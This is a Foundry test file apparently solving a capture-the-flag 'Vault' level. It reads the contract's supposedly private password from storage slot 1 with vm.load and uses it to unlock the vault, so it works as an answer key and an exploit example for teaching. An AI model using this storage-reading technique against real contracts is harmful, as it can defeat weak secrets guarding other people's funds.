// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {VaultFactory} from "src/levels/VaultFactory.sol";

interface IVault {
    function unlock(bytes32 _password) external;
}

contract VaultTest is Test {
    VaultFactory level;
    IVault target;
    address player;

    function setUp() public {
        // ----------------------------------
        // Create level instance
        // ----------------------------------
        level = new VaultFactory();
        player = makeAddr("PLAYER");
        target = IVault(level.createInstance(player));
    }

    function test_Vault() public {
        // ----------------------------------
        // Initiate attack
        // ----------------------------------

        // "private" only prevents other contracts from reading or modifying
        // slot 0: bool locked, slot 1: bytes32 password
        bytes32 password = vm.load(address(target), bytes32(uint256(1)));
        console.log(string(abi.encodePacked(password)));

        vm.prank(player);
        target.unlock(password);

        // ----------------------------------
        // Validate
        // ----------------------------------
        bool success = level.validateInstance(payable(address(target)), player);
        assertEq(success, true);
    }
}
